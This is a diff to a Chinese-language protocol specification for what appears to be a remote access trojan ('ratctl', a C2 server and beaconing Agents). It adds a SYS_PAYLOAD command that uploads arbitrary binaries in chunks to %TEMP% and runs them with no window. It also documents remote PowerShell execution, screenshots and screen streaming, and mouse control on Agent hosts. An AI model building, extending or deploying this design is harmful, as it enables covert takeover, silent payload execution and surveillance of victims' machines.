@@ -92,7 +92,7 @@ typedef struct {
 
 | 指令码 | 名称 | plugin | payload 首 16B | 说明 |
 |---|---|---|---|---|
-| 0x1001 | RMT_SCREENSHOT | 1 | agent_id | 响应：PNG/JPEG |
+| 0x1001 | RMT_SCREENSHOT | 1 | agent_id | 响应：JPEG 原始字节（可存盘） |
 | 0x1002 | RMT_SCREEN_STREAM | 1 | agent_id + 控制(u8) + fps(u8) + quality(u8) + scale%(u8) | 帧走专用长连接（§9） |
 | 0x1003 | RMT_MOUSE_MOVE | 1 | agent_id + x(i32)+y(i32) | |
 | 0x1004 | RMT_MOUSE_CLICK | 1 | agent_id + 按键(u8)+按下/释放(u8) | |
@@ -109,6 +109,7 @@ typedef struct {
 | 0x3004 | SYS_SVC_LIST | 3 | agent_id | 响应：服务数组 |
 | 0x3006 | SYS_REG_READ | 3 | agent_id + 键路径+值名 | 响应：类型+值 |
 | 0x3008 | SYS_EXEC_PS | 3 | agent_id + PowerShell 命令(UTF-8) | 响应：命令输出文本 |
+| 0x3009 | SYS_PAYLOAD | 3 | agent_id + 分块头 + 数据（见 §10） | 响应：写入/执行结果文本 |
 
 > 业务指令（0x1xxx/0x2xxx/0x3xxx）流转：CLI 发出（payload 首 16B 为目标 `agent_id`）→
 > C2 按 agent_id 查会话并**透明转发**给对应 Agent（不解密、不改 payload，仅换头部 seq 为
@@ -116,7 +117,11 @@ typedef struct {
 > req_seq+status+结果）→ C2 按 `(agent_id, 转发序号)` 映射回传给发起请求的 CLI
 > （header.seq 还原为 CLI 请求的 seq）。多 CLI 并存时按连接区分映射，互不干扰。
 >
-> 当前已实现：`SYS_INFO`（系统信息）、`SYS_EXEC_PS`（PowerShell 执行）；其余业务码 M3 插件化时启用。
+> **注意**：C2 转发时会**剥离 payload 首 16B 的 agent_id 前缀**，Agent 收到的业务参数
+> 从第 17 字节开始（`client/core/main.cpp` 中 `arg_off = 0` 即由此而来）。
+>
+> 当前已实现：`SYS_INFO`、`SYS_EXEC_PS`、`SYS_PAYLOAD`（§10）、`RMT_SCREENSHOT`（截屏）、
+> `RMT_SCREEN_STREAM`（屏幕流，§9）；其余业务码 M3 插件化时启用。
 
 ### 3.3 管理段（plugin=0xFF，仅 CLI↔C2，C2 本地处理不转发）
 
@@ -357,3 +362,59 @@ count u32  事件条数
 | 开始(0x1002 control=1) | beacon 入队 → Agent 建立 4445 连接 |
 | 停止(control=0) | beacon 入队 → Agent 断开 4445 连接；C2 清理配对 |
 | Agent 屏幕连接断开 | C2 通知 ctl（CMD_RESULT status=连接断开） |
+
+---
+
+## 10. payload 上传与执行（SYS_PAYLOAD 0x3009）
+
+用途：控制端把**任意二进制文件**（内容不限）上传到 Agent 主机并启动执行。
+C2 对该指令不做任何解析（走 §3.2 透明转发），实现只在 ctl 与 Agent 两端。
+
+### 10.1 分块载荷
+
+ctl 按 **256 KiB** 分块顺序发送；每块的 payload（**C2 已剥离 agent_id 前缀**，
+即 Agent 收到的原样字节，小端）为：
+
+```
+字段      类型   说明
+name_len  u16   文件名 UTF-8 字节数（1 ≤ name_len ≤ 128）
+name      bytes 仅文件名（不得含 \ / : ，不得为 . 或 ..）
+args_len  u16   执行参数 UTF-8 字节数（可为 0）
+args      bytes 原样拼到命令行中可执行文件之后（如 /c echo hi > out.txt）
+offset    u64   本块数据在目标文件中的起始偏移
+flags     u8    bit0=1：末块（写盘完成后立即执行）
+data_len  u32   本块数据字节数（≤ 256 KiB）
+data      bytes 数据
+```
+
+- 块序即文件序：首块 `offset=0`（`CREATE_ALWAYS` 覆盖同名旧文件），
+  其余块 `OPEN_ALWAYS` + `SetFilePointerEx(offset)` 续写；
+- `data_len > 256 KiB` 或 `offset + data_len > 64 MiB` → status=2（参数错误）；
+- 文件名走白名单校验（拒绝路径分隔符与 `..`）；落盘目录固定为 `%TEMP%\c2_payload\`，
+  不接受绝对路径；
+- 空文件也应发一个 `data_len=0` 的末块（用于触发执行）。
+
+### 10.2 Agent 执行
+
+末块写盘完成后，Agent 以
+
+```
+CreateProcessW(NULL, "\"<落盘路径>\" <args>", ..., CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
+```
+
+启动（**不等待退出**、不继承句柄、工作目录 = 落盘目录），结果文本：
+
+```
+stored <n> bytes at offset <o> -> <落盘路径>
+executed pid=<pid> size=<total>
+```
+
+- 非末块只回 `stored ...` 确认，不执行；
+- 启动失败 → status=0x80（插件错误），文本含 `CreateProcess failed (err=...)`。
+
+### 10.3 ctl 侧发送策略（ratctl / 其他控制端）
+
+- 中间块**流水线发送、不等待结果**（TCP 有序 → Agent 顺序写盘），仅末块等待 `CMD_RESULT`；
+- 这样 beacon 信道（§8）下也只需 **1 个轮询周期**即可完成上传（否则每块一个周期）；
+- 中间块的结果因"无等待者"被 ctl 读线程丢弃，不影响后到的末块结果。
+
